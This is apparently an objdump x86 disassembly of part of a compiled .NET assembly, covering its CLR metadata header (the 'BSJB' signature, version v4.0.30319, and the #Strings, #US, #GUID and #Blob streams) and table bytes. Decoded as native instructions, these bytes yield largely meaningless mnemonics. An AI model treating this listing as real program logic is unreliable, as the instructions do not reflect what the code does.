  4056c7:	0a 06                	or     (%esi),%al
  4056c9:	17                   	pop    %ss
  4056ca:	73 10                	jae    0x4056dc
  4056cc:	01 00                	add    %eax,(%eax)
  4056ce:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4056d1:	02 16                	add    (%esi),%dl
  4056d3:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4056d9:	00 0a                	add    %cl,(%edx)
  4056db:	08 6f 4f             	or     %ch,0x4f(%edi)
  4056de:	00 00                	add    %al,(%eax)
  4056e0:	0a de                	or     %dh,%bl
  4056e2:	0a 08                	or     (%eax),%cl
  4056e4:	2c 06                	sub    $0x6,%al
  4056e6:	08 6f 33             	or     %ch,0x33(%edi)
  4056e9:	00 00                	add    %al,(%eax)
  4056eb:	0a dc                	or     %ah,%bl
  4056ed:	06                   	push   %es
  4056ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4056ef:	09 01                	or     %eax,(%ecx)
  4056f1:	00 0a                	add    %cl,(%edx)
  4056f3:	0d de 0a 06 2c       	or     $0x2c060ade,%eax
  4056f8:	06                   	push   %es
  4056f9:	06                   	push   %es
  4056fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4056fb:	33 00                	xor    (%eax),%eax
  4056fd:	00 0a                	add    %cl,(%edx)
  4056ff:	dc 09                	fmull  (%ecx)
  405701:	2a 00                	sub    (%eax),%al
  405703:	00 01                	add    %al,(%ecx)
  405705:	1c 00                	sbb    $0x0,%al
  405707:	00 02                	add    %al,(%edx)
  405709:	00 20                	add    %ah,(%eax)
  40570b:	00 13                	add    %dl,(%ebx)
  40570d:	33 00                	xor    (%eax),%eax
  40570f:	0a 00                	or     (%eax),%al
  405711:	00 00                	add    %al,(%eax)
  405713:	00 02                	add    %al,(%edx)
  405715:	00 06                	add    %al,(%esi)
  405717:	00 40 46             	add    %al,0x46(%eax)
  40571a:	00 0a                	add    %cl,(%edx)
  40571c:	00 00                	add    %al,(%eax)
  40571e:	00 00                	add    %al,(%eax)
  405720:	42                   	inc    %edx
  405721:	53                   	push   %ebx
  405722:	4a                   	dec    %edx
  405723:	42                   	inc    %edx
  405724:	01 00                	add    %eax,(%eax)
  405726:	01 00                	add    %eax,(%eax)
  405728:	00 00                	add    %al,(%eax)
  40572a:	00 00                	add    %al,(%eax)
  40572c:	0c 00                	or     $0x0,%al
  40572e:	00 00                	add    %al,(%eax)
  405730:	76 34                	jbe    0x405766
  405732:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405735:	33 30                	xor    (%eax),%esi
  405737:	33 31                	xor    (%ecx),%esi
  405739:	39 00                	cmp    %eax,(%eax)
  40573b:	00 00                	add    %al,(%eax)
  40573d:	00 05 00 6c 00 00    	add    %al,0x6c00
  405743:	00 64 1d 00          	add    %ah,0x0(%ebp,%ebx,1)
  405747:	00 23                	add    %ah,(%ebx)
  405749:	7e 00                	jle    0x40574b
  40574b:	00 d0                	add    %dl,%al
  40574d:	1d 00 00 60 26       	sbb    $0x26600000,%eax
  405752:	00 00                	add    %al,(%eax)
  405754:	23 53 74             	and    0x74(%ebx),%edx
  405757:	72 69                	jb     0x4057c2
  405759:	6e                   	outsb  %ds:(%esi),(%dx)
  40575a:	67 73 00             	addr16 jae 0x40575d
  40575d:	00 00                	add    %al,(%eax)
  40575f:	00 30                	add    %dh,(%eax)
  405761:	44                   	inc    %esp
  405762:	00 00                	add    %al,(%eax)
  405764:	f0 27                	lock daa
  405766:	00 00                	add    %al,(%eax)
  405768:	23 55 53             	and    0x53(%ebp),%edx
  40576b:	00 20                	add    %ah,(%eax)
  40576d:	6c                   	insb   (%dx),%es:(%edi)
  40576e:	00 00                	add    %al,(%eax)
  405770:	10 00                	adc    %al,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	23 47 55             	and    0x55(%edi),%eax
  405777:	49                   	dec    %ecx
  405778:	44                   	inc    %esp
  405779:	00 00                	add    %al,(%eax)
  40577b:	00 30                	add    %dh,(%eax)
  40577d:	6c                   	insb   (%dx),%es:(%edi)
  40577e:	00 00                	add    %al,(%eax)
  405780:	68 09 00 00 23       	push   $0x23000009
  405785:	42                   	inc    %edx
  405786:	6c                   	insb   (%dx),%es:(%edi)
  405787:	6f                   	outsl  %ds:(%esi),(%dx)
  405788:	62 00                	bound  %eax,(%eax)
  40578a:	00 00                	add    %al,(%eax)
  40578c:	00 00                	add    %al,(%eax)
  40578e:	00 00                	add    %al,(%eax)
  405790:	02 00                	add    (%eax),%al
  405792:	00 01                	add    %al,(%ecx)
  405794:	57                   	push   %edi
  405795:	9f                   	lahf
  405796:	a2 3f 09 0a 00       	mov    %al,0xa093f
  40579b:	00 00                	add    %al,(%eax)
  40579d:	fa                   	cli
  40579e:	25 33 00 16 00       	and    $0x160033,%eax
  4057a3:	00 01                	add    %al,(%ecx)
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 9b 00 00 00 1d    	add    %bl,0x1d000000(%ebx)
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 45 00             	add    %al,0x0(%ebp)
  4057b2:	00 00                	add    %al,(%eax)
  4057b4:	a1 00 00 00 6e       	mov    0x6e000000,%eax
  4057b9:	00 00                	add    %al,(%eax)
  4057bb:	00 02                	add    %al,(%edx)
  4057bd:	00 00                	add    %al,(%eax)
  4057bf:	00 10                	add    %dl,(%eax)
  4057c1:	01 00                	add    %eax,(%eax)
  4057c3:	00 13                	add    %dl,(%ebx)
  4057c5:	00 00                	add    %al,(%eax)
  4057c7:	00 2d 00 00 00 02    	add    %ch,0x2000000
  4057cd:	00 00                	add    %al,(%eax)
  4057cf:	00 2e                	add    %ch,(%esi)
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 04 00             	add    %al,(%eax,%eax,1)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	12 00                	adc    (%eax),%al
  4057da:	00 00                	add    %al,(%eax)
  4057dc:	1e                   	push   %ds
  4057dd:	00 00                	add    %al,(%eax)
  4057df:	00 04 00             	add    %al,(%eax,%eax,1)
  4057e2:	00 00                	add    %al,(%eax)
  4057e4:	02 00                	add    (%eax),%al
  4057e6:	00 00                	add    %al,(%eax)
  4057e8:	06                   	push   %es
  4057e9:	00 00                	add    %al,(%eax)
  4057eb:	00 04 00             	add    %al,(%eax,%eax,1)
  4057ee:	00 00                	add    %al,(%eax)
  4057f0:	02 00                	add    (%eax),%al
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	01 00                	add    %eax,(%eax)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	08 00                	or     %al,(%eax)
  4057fa:	00 00                	add    %al,(%eax)
  4057fc:	04 00                	add    $0x0,%al
  4057fe:	00 00                	add    %al,(%eax)
  405800:	03 00                	add    (%eax),%eax
  405802:	00 00                	add    %al,(%eax)
  405804:	00 00                	add    %al,(%eax)
  405806:	eb 01                	jmp    0x405809
  405808:	01 00                	add    %eax,(%eax)
  40580a:	00 00                	add    %al,(%eax)
  40580c:	00 00                	add    %al,(%eax)
  40580e:	06                   	push   %es
  40580f:	00 ac 20 a2 17 0a 00 	add    %ch,0xa17a2(%eax,%eiz,1)
  405816:	4c                   	dec    %esp
  405817:	00 80 1e 0a 00 e7    	add    %al,-0x18fff5e2(%eax)
  40581d:	20 08                	and    %cl,(%eax)
  40581f:	20 0a                	and    %cl,(%edx)
  405821:	00 56 17             	add    %dl,0x17(%esi)
  405824:	90                   	nop
  405825:	25 06 00 8c 1c       	and    $0x1c8c0006,%eax
  40582a:	85 13                	test   %edx,(%ebx)
  40582c:	06                   	push   %es
  40582d:	00 1e                	add    %bl,(%esi)
  40582f:	10 80 1e 0a 00 91    	adc    %al,-0x6efff5e2(%eax)
  405835:	18 80 1e 0a 00 d1    	sbb    %al,-0x2efff5e2(%eax)
  40583b:	1f                   	pop    %ds
  40583c:	90                   	nop
  40583d:	25 06 00 44 21       	and    $0x21440006,%eax
  405842:	a2 17 06 00 b4       	mov    %al,0xb4000617
  405847:	13 c2                	adc    %edx,%eax
  405849:	22 06                	and    (%esi),%al
  40584b:	00 d9                	add    %bl,%cl
  40584d:	1c 8b                	sbb    $0x8b,%al
  40584f:	1f                   	pop    %ds
  405850:	06                   	push   %es
  405851:	00 24 00             	add    %ah,(%eax,%eax,1)
  405854:	fd                   	std
  405855:	0a 06                	or     (%esi),%al
  405857:	00 09                	add    %cl,(%ecx)
  405859:	0e                   	push   %cs
  40585a:	8b 1f                	mov    (%edi),%ebx
  40585c:	06                   	push   %es
  40585d:	00 7e 17             	add    %bh,0x17(%esi)
  405860:	dc 05 06 00 19 18    	faddl  0x18190006
  405866:	a2 17 0a 00 f6       	mov    %al,0xf6000a17
  40586b:	1f                   	pop    %ds
  40586c:	c8 1d 0e 00          	enter  $0xe1d,$0x0
  405870:	02 1a                	add    (%edx),%bl
  405872:	c1 13 0e             	rcll   $0xe,(%ebx)
  405875:	00 7a 20             	add    %bh,0x20(%edx)
  405878:	c1 13 06             	rcll   $0x6,(%ebx)
  40587b:	00 48 24             	add    %cl,0x24(%eax)
  40587e:	85 13                	test   %edx,(%ebx)
  405880:	0a 00                	or     (%eax),%al
  405882:	13 1f                	adc    (%edi),%ebx
  405884:	2b 00                	sub    (%eax),%eax
  405886:	12 00                	adc    (%eax),%al
  405888:	19 00                	sbb    %eax,(%eax)
  40588a:	18 1e                	sbb    %bl,(%esi)
  40588c:	12 00                	adc    (%eax),%al
  40588e:	01 00                	add    %eax,(%eax)
  405890:	a2 17 12 00 54       	mov    %al,0x54001217
  405895:	10 18                	adc    %bl,(%eax)
  405897:	1e                   	push   %ds
  405898:	06                   	push   %es
  405899:	00 bf 0f a2 17 06    	add    %bh,0x617a20f(%edi)
  40589f:	00 61 11             	add    %ah,0x11(%ecx)
  4058a2:	18 1e                	sbb    %bl,(%esi)
  4058a4:	06                   	push   %es
  4058a5:	00 ce                	add    %cl,%dh
  4058a7:	11 18                	adc    %ebx,(%eax)
  4058a9:	1e                   	push   %ds
  4058aa:	06                   	push   %es
  4058ab:	00 7e 10             	add    %bh,0x10(%esi)
  4058ae:	c8 1d 6f 00          	enter  $0x6f1d,$0x0
  4058b2:	38 1e                	cmp    %bl,(%esi)
  4058b4:	00 00                	add    %al,(%eax)
  4058b6:	06                   	push   %es
  4058b7:	00 a6 10 27 19 06    	add    %ah,0x6192710(%esi)
  4058bd:	00 2d 11 27 19 06    	add    %ch,0x6192711
  4058c3:	00 0e                	add    %cl,(%esi)
  4058c5:	11 27                	adc    %esp,(%edi)
  4058c7:	19 06                	sbb    %eax,(%esi)
  4058c9:	00 b5 11 27 19 06    	add    %dh,0x6192711(%ebp)
  4058cf:	00 81 11 27 19 06    	add    %al,0x6192711(%ecx)
  4058d5:	00 9a 11 27 19 06    	add    %bl,0x6192711(%edx)
  4058db:	00 bd 10 27 19 06    	add    %bh,0x6192710(%ebp)
  4058e1:	00 92 10 f9 1d 06    	add    %dl,0x61df910(%edx)
  4058e7:	00 f1                	add    %dh,%cl
  4058e9:	10 27                	adc    %ah,(%edi)
  4058eb:	19 06                	sbb    %eax,(%esi)
  4058ed:	00 d8                	add    %bl,%al
  4058ef:	10 d8                	adc    %bl,%al
  4058f1:	13 06                	adc    (%esi),%eax
  4058f3:	00 63 10             	add    %ah,0x10(%ebx)
  4058f6:	18 1e                	sbb    %bl,(%esi)
  4058f8:	06                   	push   %es
  4058f9:	00 4a 11             	add    %cl,0x11(%edx)
  4058fc:	27                   	daa
  4058fd:	19 06                	sbb    %eax,(%esi)
  4058ff:	00 b8 0b 85 13 06    	add    %bh,0x613850b(%eax)
  405905:	00 7d 22             	add    %bh,0x22(%ebp)
  405908:	a2 17 06 00 cb       	mov    %al,0xcb000617
  40590d:	21 a2 17 06 00 e3    	and    %esp,-0x1cfff9e9(%edx)
  405913:	17                   	pop    %ss
  405914:	a2 17 06 00 b8       	mov    %al,0xb8000617
  405919:	13 c2                	adc    %edx,%eax
  40591b:	22 0a                	and    (%edx),%cl
  40591d:	00 fc                	add    %bh,%ah
  40591f:	24 80                	and    $0x80,%al
  405921:	1e                   	push   %ds
  405922:	06                   	push   %es
  405923:	00 bc 17 12 25 06 00 	add    %bh,0x62512(%edi,%edx,1)
  40592a:	b9 1b 12 25 06       	mov    $0x625121b,%ecx
  40592f:	00 59 13             	add    %bl,0x13(%ecx)
  405932:	12 25 06 00 b0 19    	adc    0x19b00006,%ah
  405938:	a2 17 0a 00 fe       	mov    %al,0xfe000a17
  40593d:	1f                   	pop    %ds
  40593e:	c7                   	(bad)
  40593f:	20 0a                	and    %cl,(%edx)
  405941:	00 62 21             	add    %ah,0x21(%edx)
  405944:	c7                   	(bad)
  405945:	20 0a                	and    %cl,(%edx)
  405947:	00 a6 16 c7 20 0a    	add    %ah,0xa20c716(%esi)
  40594d:	00 38                	add    %bh,(%eax)
  40594f:	25 08 20 0a 00       	and    $0xa2008,%eax
  405954:	de 0f                	fimuls (%edi)
  405956:	08 20                	or     %ah,(%eax)
  405958:	0a 00                	or     (%eax),%al
  40595a:	c9                   	leave
  40595b:	0f 08                	invd
  40595d:	20 06                	and    %al,(%esi)
  40595f:	00 47 14             	add    %al,0x14(%edi)
  405962:	a2 17 06 00 83       	mov    %al,0x83000617
  405967:	1b a2 17 0a 00 7e    	sbb    0x7e000a17(%edx),%esp
  40596d:	1f                   	pop    %ds
  40596e:	c7                   	(bad)
  40596f:	20 0a                	and    %cl,(%edx)
  405971:	00 2a                	add    %ch,(%edx)
  405973:	1f                   	pop    %ds
  405974:	c7                   	(bad)
  405975:	20 06                	and    %al,(%esi)
  405977:	00 9e 1f a2 17 06    	add    %bl,0x617a21f(%esi)
  40597d:	00 15 0e a2 17 0a    	add    %dl,0xa17a20e
  405983:	00 48 17             	add    %cl,0x17(%eax)
  405986:	08 20                	or     %ah,(%eax)
  405988:	0a 00                	or     (%eax),%al
  40598a:	bd 15 90 25 0a       	mov    $0xa259015,%ebp
  40598f:	00 32                	add    %dh,(%edx)
  405991:	22 c7                	and    %bh,%al
  405993:	20 0a                	and    %cl,(%edx)
  405995:	00 39                	add    %bh,(%ecx)
  405997:	19 80 1e 0a 00 4e    	sbb    %eax,0x4e000a1e(%eax)
  40599d:	1f                   	pop    %ds
  40599e:	08 19                	or     %bl,(%ecx)
  4059a0:	06                   	push   %es
  4059a1:	00 0e                	add    %cl,(%esi)
  4059a3:	12 a2 17 06 00 e1    	adc    -0x1efff9e9(%edx),%ah
  4059a9:	15 85 13 06 00       	adc    $0x61385,%eax
  4059ae:	af                   	scas   %es:(%edi),%eax
  4059af:	15 a2 17 0a 00       	adc    $0xa17a2,%eax
  4059b4:	3f                   	aas
  4059b5:	15 a2 17 0a 00       	adc    $0xa17a2,%eax
  4059ba:	ab                   	stos   %eax,%es:(%edi)
  4059bb:	0f a2                	cpuid
  4059bd:	17                   	pop    %ss
  4059be:	06                   	push   %es
  4059bf:	00 c4                	add    %al,%ah
  4059c1:	1c a2                	sbb    $0xa2,%al
  4059c3:	17                   	pop    %ss
  4059c4:	06                   	push   %es
  4059c5:	00 64 22 85          	add    %ah,-0x7b(%edx,%eiz,1)
  4059c9:	13 06                	adc    (%esi),%eax
  4059cb:	00 78 17             	add    %bh,0x17(%eax)
  4059ce:	dc 05 06 00 44 1d    	faddl  0x1d440006
  4059d4:	85 13                	test   %edx,(%ebx)
  4059d6:	0a 00                	or     (%eax),%al
  4059d8:	da 0d 08 20 06 00    	fimull 0x62008
  4059de:	42                   	inc    %edx
  4059df:	01 a2 17 06 00 eb    	add    %esp,-0x14fff9e9(%edx)
  4059e5:	1b c2                	sbb    %edx,%eax
  4059e7:	22 33                	and    (%ebx),%dh
  4059e9:	00 22                	add    %ah,(%edx)
  4059eb:	1d 00 00 06 00       	sbb    $0x60000,%eax
  4059f0:	68 00 a2 17 06       	push   $0x617a200
  4059f5:	00 5f 00             	add    %bl,0x0(%edi)
  4059f8:	a2 17 06 00 23       	mov    %al,0x23000617
  4059fd:	0e                   	push   %cs
  4059fe:	a2 17 06 00 89       	mov    %al,0x89000617
  405a03:	0e                   	push   %cs
  405a04:	a2 17 06 00 6e       	mov    %al,0x6e000617
  405a09:	0f a2                	cpuid
  405a0b:	17                   	pop    %ss
  405a0c:	06                   	push   %es
  405a0d:	00 3d 17 dc 05 06    	add    %bh,0x605dc17
  405a13:	00 90 0e dc 05 06    	add    %dl,0x605dc0e(%eax)
  405a19:	00 8a 0d dc 05 06    	add    %cl,0x605dc0d(%edx)
  405a1f:	00 e1                	add    %ah,%cl
  405a21:	1f                   	pop    %ds
  405a22:	dc 05 06 00 e9 0f    	faddl  0xfe90006
  405a28:	dc 05 06 00 c2 1f    	faddl  0x1fc20006
  405a2e:	18 1e                	sbb    %bl,(%esi)
  405a30:	06                   	push   %es
  405a31:	00 ca                	add    %cl,%dl
  405a33:	24 a2                	and    $0xa2,%al
  405a35:	17                   	pop    %ss
  405a36:	06                   	push   %es
  405a37:	00 35 0e a2 17 06    	add    %dh,0x617a20e
  405a3d:	00 75 18             	add    %dh,0x18(%ebp)
  405a40:	a2 17 06 00 11       	mov    %al,0x11000617
  405a45:	1a dc                	sbb    %ah,%bl
  405a47:	05 0a 00 61 1a       	add    $0x1a61000a,%eax
  405a4c:	c8 1d 06 00          	enter  $0x61d,$0x0
  405a50:	06                   	push   %es
  405a51:	25 2b 00 06 00       	and    $0x6002b,%eax
  405a56:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405a57:	1c dc                	sbb    $0xdc,%al
  405a59:	05 06 00 06 15       	add    $0x15060006,%eax
  405a5e:	dc 05 0a 00 c0 0e    	faddl  0xec0000a
  405a64:	c8 1d 06 00          	enter  $0x61d,$0x0
  405a68:	24 1a                	and    $0x1a,%al
  405a6a:	dc 05 0a 00 de 0e    	faddl  0xede000a
  405a70:	c8 1d 06 00          	enter  $0x61d,$0x0
  405a74:	6d                   	insl   (%dx),%es:(%edi)
  405a75:	25 2b 00 16 00       	and    $0x16002b,%eax
  405a7a:	0b 1f                	or     (%edi),%ebx
  405a7c:	18 0b                	sbb    %cl,(%ebx)
  405a7e:	06                   	push   %es
  405a7f:	00 ef                	add    %ch,%bh
  405a81:	15 2b 00 06 00       	adc    $0x6002b,%eax
  405a86:	b3 1c                	mov    $0x1c,%bl
  405a88:	dc 05 06 00 1a 1a    	faddl  0x1a1a0006
  405a8e:	dc 05 16 00 33 1a    	faddl  0x1a330016
  405a94:	db 1d 1a 00 59 1c    	fistpl 0x1c59001a
  405a9a:	b9 21 1a 00 53       	mov    $0x53001a21,%ecx
  405a9f:	19 b9 21 bb 01 e5    	sbb    %edi,-0x1afe44df(%ecx)
  405aa5:	1c 00                	sbb    $0x0,%al
  405aa7:	00 1a                	add    %bl,(%edx)
  405aa9:	00 9e 20 b9 21 06    	add    %bl,0x621b920(%esi)
  405aaf:	00 6c 1d a2          	add    %ch,-0x5e(%ebp,%ebx,1)
  405ab3:	17                   	pop    %ss
  405ab4:	06                   	push   %es
  405ab5:	00 46 00             	add    %al,0x0(%esi)
  405ab8:	a2 17 12 00 0a       	mov    %al,0xa001217
  405abd:	0e                   	push   %cs
  405abe:	51                   	push   %ecx
  405abf:	1b 06                	sbb    (%esi),%eax
  405ac1:	00 0b                	add    %cl,(%ebx)
  405ac3:	00 fd                	add    %bh,%ch
  405ac5:	0a 06                	or     (%esi),%al
  405ac7:	00 99 17 a2 17 06    	add    %bl,0x617a217(%ecx)
  405acd:	00 a0 1b 12 25 06    	add    %ah,0x625121b(%eax)
  405ad3:	00 d0                	add    %dl,%al
  405ad5:	17                   	pop    %ss
  405ad6:	12 25 1e 00 fc 18    	adc    0x18fc001e,%ah
  405adc:	69 1f 06 00 a4 25    	imul   $0x25a40006,(%edi),%ebx
  405ae2:	b8 16 06 00 d2       	mov    $0xd2000616,%eax
  405ae7:	16                   	push   %ss
  405ae8:	b8 16 06 00 9e       	mov    $0x9e000616,%eax
  405aed:	0e                   	push   %cs
  405aee:	b8 16 06 00 08       	mov    $0x8000616,%eax
  405af3:	0c a2                	or     $0xa2,%al
  405af5:	17                   	pop    %ss
  405af6:	06                   	push   %es
  405af7:	00 7c 0e 85          	add    %bh,-0x7b(%esi,%ecx,1)
  405afb:	13 0a                	adc    (%edx),%ecx
  405afd:	00 72 1c             	add    %dh,0x1c(%edx)
  405b00:	2b 00                	sub    (%eax),%eax
  405b02:	0a 00                	or     (%eax),%al
  405b04:	29 20                	sub    %esp,(%eax)
  405b06:	2b 00                	sub    (%eax),%eax
  405b08:	06                   	push   %es
  405b09:	00 18                	add    %bl,(%eax)
  405b0b:	0d 2b 00 06 00       	or     $0x6002b,%eax
  405b10:	9b                   	fwait
  405b11:	18 a2 17 06 00 2f    	sbb    %ah,0x2f000617(%edx)
  405b17:	25 27 19 06 00       	and    $0x61927,%eax
  405b1c:	e4 0f                	in     $0xf,%al
  405b1e:	a2 17 06 00 2d       	mov    %al,0x2d000617
  405b23:	1d a2 17 06 00       	sbb    $0x617a2,%eax
  405b28:	58                   	pop    %eax
  405b29:	0e                   	push   %cs
  405b2a:	a2 17 22 00 40       	mov    %al,0x40002217
  405b2f:	1a f9                	sbb    %cl,%bh
  405b31:	1b 22                	sbb    (%edx),%esp
  405b33:	00 e1                	add    %ah,%cl
  405b35:	1e                   	push   %ds
  405b36:	f9                   	stc
  405b37:	1b 22                	sbb    (%edx),%esp
  405b39:	00 20                	add    %ah,(%eax)
  405b3b:	1c f9                	sbb    $0xf9,%al
  405b3d:	1b 12                	sbb    (%edx),%edx
  405b3f:	00 18                	add    %bl,(%eax)
  405b41:	1c 18                	sbb    $0x18,%al
  405b43:	1e                   	push   %ds
  405b44:	22 00                	and    (%eax),%al
  405b46:	f9                   	stc
  405b47:	1e                   	push   %ds
  405b48:	f9                   	stc
  405b49:	1b 06                	sbb    (%esi),%eax
  405b4b:	00 ae 1e 12 25 06    	add    %ch,0x625121e(%esi)
  405b51:	00 a8 19 a2 17 06    	add    %ch,0x617a219(%eax)
  405b57:	00 b5 1e 12 25 12    	add    %dh,0x1225121e(%ebp)
  405b5d:	00 d2                	add    %dl,%dl
  405b5f:	1b 12                	sbb    (%edx),%edx
  405b61:	25 06 00 60 17       	and    $0x17600006,%eax
  405b66:	12 25 06 00 7f 00    	adc    0x7f0006,%ah
  405b6c:	12 25 06 00 92 19    	adc    0x19920006,%ah
  405b72:	a2 17 06 00 a9       	mov    %al,0xa9000617
  405b77:	17                   	pop    %ss
  405b78:	12 25 06 00 cf 0d    	adc    0xdcf0006,%ah
  405b7e:	12 25 06 00 93 0d    	adc    0xd930006,%ah
  405b84:	12 25 06 00 ea 17    	adc    0x17ea0006,%ah
  405b8a:	12 25 06 00 ae 0d    	adc    0xdae0006,%ah
  405b90:	12 25 06 00 7b 19    	adc    0x197b0006,%ah
  405b96:	12 25 06 00 36 1c    	adc    0x1c360006,%ah
  405b9c:	a2 17 06 00 c8       	mov    %al,0xc8000617
  405ba1:	0b 12                	or     (%edx),%edx
  405ba3:	25 0a 00 6d 17       	and    $0x176d000a,%eax
  405ba8:	e6 18                	out    %al,$0x18
  405baa:	0a 00                	or     (%eax),%al
  405bac:	bf 0d e6 18 00       	mov    $0x18e60d,%edi
  405bb1:	00 00                	add    %al,(%eax)
  405bb3:	00 93 00 00 00 00    	add    %dl,0x0(%ebx)
  405bb9:	00 01                	add    %al,(%ecx)
  405bbb:	00 01                	add    %al,(%ecx)
  405bbd:	00 01                	add    %al,(%ecx)
  405bbf:	00 10                	add    %dl,(%eax)
  405bc1:	00 fa                	add    %bh,%dl
  405bc3:	01 9a 1a 05 00 01    	add    %ebx,0x100051a(%edx)
  405bc9:	00 01                	add    %al,(%ecx)
  405bcb:	00 81 01 10 00 76    	add    %al,0x76001001(%ecx)
  405bd1:	24 9a                	and    $0x9a,%al
  405bd3:	1a 05 00 01 00 03    	sbb    0x3000100,%al
  405bd9:	00 81 01 10 00 92    	add    %al,-0x6dffefff(%ecx)
  405bdf:	04 b4                	add    $0xb4,%al
  405be1:	05 05 00 12 00       	add    $0x120005,%eax
  405be6:	06                   	push   %es
  405be7:	00 01                	add    %al,(%ecx)
  405be9:	00 10                	add    %dl,(%eax)
  405beb:	00 91 02 cf 0a 05    	add    %dl,0x50acf02(%ecx)
  405bf1:	00 1c 00             	add    %bl,(%eax,%eax,1)
  405bf4:	22 00                	and    (%eax),%al
  405bf6:	01 00                	add    %eax,(%eax)
  405bf8:	10 00                	adc    %al,(%eax)
  405bfa:	ec                   	in     (%dx),%al
  405bfb:	0a cf                	or     %bh,%cl
  405bfd:	0a 05 00 1d 00 2d    	or     0x2d001d00,%al
  405c03:	00 01                	add    %al,(%ecx)
  405c05:	00 10                	add    %dl,(%eax)
  405c07:	00 85 09 cf 0a 05    	add    %al,0x50acf09(%ebp)
  405c0d:	00 1f                	add    %bl,(%edi)
  405c0f:	00 31                	add    %dh,(%ecx)
  405c11:	00 01                	add    %al,(%ecx)
  405c13:	00 10                	add    %dl,(%eax)
  405c15:	00 72 0a             	add    %dh,0xa(%edx)
  405c18:	cf                   	iret
  405c19:	0a 05 00 21 00 38    	or     0x38002100,%al
  405c1f:	00 01                	add    %al,(%ecx)
  405c21:	01 00                	add    %eax,(%eax)
  405c23:	00 e1                	add    %ah,%cl
  405c25:	25 cf 0a 3d 00       	and    $0x3d0acf,%eax
  405c2a:	28 00                	sub    %al,(%eax)
  405c2c:	63 00                	arpl   %eax,(%eax)
  405c2e:	00 00                	add    %al,(%eax)
  405c30:	10 00                	adc    %al,(%eax)
  405c32:	42                   	inc    %edx
  405c33:	06                   	push   %es
  405c34:	cf                   	iret
  405c35:	0a 05 00 35 00 63    	or     0x63003500,%al
  405c3b:	00 00                	add    %al,(%eax)
  405c3d:	00 10                	add    %dl,(%eax)
  405c3f:	00 e2                	add    %ah,%dl
  405c41:	02 cf                	add    %bh,%cl
  405c43:	0a 05 00 35 00 67    	or     0x67003500,%al
  405c49:	00 00                	add    %al,(%eax)
  405c4b:	00 10                	add    %dl,(%eax)
  405c4d:	00 a2 07 76 07 05    	add    %ah,0x5077607(%edx)
  405c53:	00 35 00 70 00 00    	add    %dh,0x7000
  405c59:	00 10                	add    %dl,(%eax)
  405c5b:	00 72 16             	add    %dh,0x16(%edx)
  405c5e:	73 1d                	jae    0x405c7d
  405c60:	05 00 35 00 72       	add    $0x72003500,%eax
  405c65:	00 00                	add    %al,(%eax)
  405c67:	00 10                	add    %dl,(%eax)
  405c69:	00 39                	add    %bh,(%ecx)
  405c6b:	09 73 1d             	or     %esi,0x1d(%ebx)
  405c6e:	05 00 35 00 7b       	add    $0x7b003500,%eax
  405c73:	00 81 01 10 00 86    	add    %al,-0x79ffefff(%ecx)
  405c79:	03 73 1d             	add    0x1d(%ebx),%esi
  405c7c:	05 00 35 00 7e       	add    $0x7e003500,%eax
  405c81:	00 81 01 10 00 96    	add    %al,-0x69ffefff(%ecx)
  405c87:	1d 73 1d 05 00       	sbb    $0x51d73,%eax
  405c8c:	35 00 80 00 80       	xor    $0x80008000,%eax
  405c91:	01 10                	add    %edx,(%eax)
  405c93:	00 bd 06 73 1d 05    	add    %bh,0x51d7306(%ebp)
  405c99:	00 35 00 81 00 02    	add    %dh,0x2008100
  405c9f:	01 00                	add    %eax,(%eax)
  405ca1:	00 db                	add    %bl,%bl
  405ca3:	00 00                	add    %al,(%eax)
  405ca5:	00 3d 00 35 00 87    	add    %bh,0x87003500
  405cab:	00 81 01 10 00 74    	add    %al,0x74001001(%ecx)
  405cb1:	0b 73 1d             	or     0x1d(%ebx),%esi
  405cb4:	05 00 39 00 87       	add    $0x87003900,%eax
  405cb9:	00 81 01 10 00 27    	add    %al,0x27001001(%ecx)
  405cbf:	07                   	pop    %es
  405cc0:	73 1d                	jae    0x405cdf
  405cc2:	05 00 3a 00 89       	add    $0x89003a00,%eax
  405cc7:	00 81 01 10 00 c6    	add    %al,-0x39ffefff(%ecx)
  405ccd:	04 73                	add    $0x73,%al
  405ccf:	1d 05 00 3a 00       	sbb    $0x3a0005,%eax
  405cd4:	8d 00                	lea    (%eax),%eax
  405cd6:	81 01 10 00 3d 20    	addl   $0x203d0010,(%ecx)
  405cdc:	41                   	inc    %ecx
  405cdd:	05 05 00 3b 00       	add    $0x3b0005,%eax
  405ce2:	92                   	xchg   %eax,%edx
  405ce3:	00 83 01 10 00 fa    	add    %al,-0x5ffefff(%ebx)
  405ce9:	04 00                	add    $0x0,%al
  405ceb:	00 05 00 3c 00 97    	add    %al,0x97003c00
  405cf1:	00 01                	add    %al,(%ecx)
  405cf3:	00 10                	add    %dl,(%eax)
  405cf5:	00 a8 1a 3d 02 05    	add    %ch,0x5023d1a(%eax)
  405cfb:	00 3d 00 97 00 81    	add    %bh,0x81009700
  405d01:	01 10                	add    %edx,(%eax)
  405d03:	00 a9 05 3d 02 05    	add    %ch,0x5023d05(%ecx)
  405d09:	00 44 00 9e          	add    %al,-0x62(%eax,%eax,1)
  405d0d:	00 81 01 10 00 30    	add    %al,0x30001001(%ecx)
  405d13:	01 3d 02 05 00 44    	add    %edi,0x44000502
  405d19:	00 a0 00 00 01 00    	add    %ah,0x10000(%eax)
  405d1f:	00 bd 1d 00 00 05    	add    %bh,0x500001d(%ebp)
  405d25:	00 44 00 a2          	add    %al,-0x5e(%eax,%eax,1)
  405d29:	00 13                	add    %dl,(%ebx)
  405d2b:	01 00                	add    %eax,(%eax)
  405d2d:	00 b3 01 00 00 61    	add    %dh,0x61000001(%ebx)
  405d33:	00 46 00             	add    %al,0x0(%esi)
  405d36:	a2 00 13 01 00       	mov    %al,0x11300
  405d3b:	00 f3                	add    %dh,%bl
  405d3d:	05 00 00 61 00       	add    $0x610000,%eax
  405d42:	46                   	inc    %esi
